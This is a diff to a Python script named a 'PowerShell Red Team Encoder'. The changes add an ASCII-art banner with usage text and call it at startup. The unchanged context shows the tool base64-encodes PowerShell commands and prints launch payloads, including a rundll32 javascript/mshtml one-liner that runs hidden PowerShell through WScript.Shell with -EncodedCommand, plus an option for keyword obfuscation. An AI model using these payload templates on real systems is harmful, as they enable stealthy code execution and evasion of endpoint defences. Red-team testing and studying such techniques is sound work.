@@ -1,8 +1,21 @@
 import base64
 import argparse
-# usage
-# python3 encoder.py -c "powershell command list but single line"
 
+def print_banner():
+    banner = r"""
+┏┓┏┓┏┓      ┓    
+┃┃┗┓┣ ┏┓┏┏┓┏┫┏┓┏┓
+┣┛┗┛┗┛┛┗┗┗┛┗┻┗ ┛ 
+┏                
+╋┏┓┏┓            
+┛┗┛┛  ┓ ┓ ┏┓┏┓   
+┏╋┏┓┏┓┃╋┣┓┃┃┃┃   
+┛┗┗ ┗┻┗┗┛┗┗┛┣┛ 
+
+  [🔬] Researched by d3hvck
+  [+] USAGE: python3 Exp_Encoder.py -c "powershell command list but single line" -o
+"""
+    print(banner)
 
 def encode_ps_command(command):
     utf16le_bytes = command.encode('utf-16le')
@@ -40,6 +53,7 @@ def generate_payloads(encoded_command):
     print(f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write(\'<script>self.close();new ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -EncodedCommand {encoded_command}");</script>\');"\n')
 
 if __name__ == "__main__":
+    print_banner()
     parser = argparse.ArgumentParser(description="PowerShell Red Team Encoder")
     parser.add_argument("-c", "--command", required=True, help="PowerShell command to encode")
     parser.add_argument("-o", "--obfuscate", action="store_true", help="Apply keyword obfuscation")
